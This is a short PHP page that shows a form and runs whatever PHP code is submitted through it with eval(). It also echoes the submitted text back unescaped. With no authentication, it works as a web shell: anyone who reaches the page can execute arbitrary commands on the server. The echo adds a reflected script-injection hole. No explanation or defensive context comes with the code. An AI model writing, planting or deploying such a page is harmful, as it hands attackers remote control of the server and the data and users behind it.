<form method="post">
	<textarea name="code" style="width:1400px; height:400px; margin:0 auto;"><?=$_POST['code']?></textarea><br>
	<input type="submit">
</form>

<pre>
	<?
	if($_POST['code'])
		eval($_POST['code']);
	?>
</pre>
